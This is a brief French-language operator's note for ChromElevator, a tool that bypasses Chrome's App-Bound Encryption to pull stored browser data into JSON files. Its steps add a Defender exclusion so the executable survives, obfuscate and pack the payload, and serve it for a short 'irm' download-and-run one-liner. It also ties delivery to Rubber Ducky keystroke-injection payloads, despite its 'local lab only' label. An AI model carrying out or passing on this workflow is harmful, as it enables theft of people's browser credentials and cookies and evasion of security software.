ChromElevator — lab local uniquement (ABE / IElevator)

1) Téléchargement déjà dans chrome-injector-v0.20.0.zip (release xaitax v0.20.0)
2) Extraire dans .\extracted\
3) Si chromelevator_x64.exe disparaît : exclusion Defender sur ce dossier
4) Lancer :
   pwsh -File ..\..\scripts\chrome-extract-abe.ps1
   Pentest (obfuscation lab, pas bypass AMSI) :
     pack-chrome-abe-obf.ps1
     test-chrome-extract-abe.ps1 -Mode obf -PackFirst
     serve-chrome-abe-payload.ps1  -> irm courte comme wifi_pull
5) JSON complets dans %TEMP%\chromelevator-out\
   Résumé : %TEMP%\chrome-leonardo-abe.txt

Ne pas publier l'exe sur GitHub BL4CK-SUN/Ducky (payloads = .ps1 seulement).
Pour Ducky : télécharger + exécuter l'exe = autre chaîne (pas clavier seul).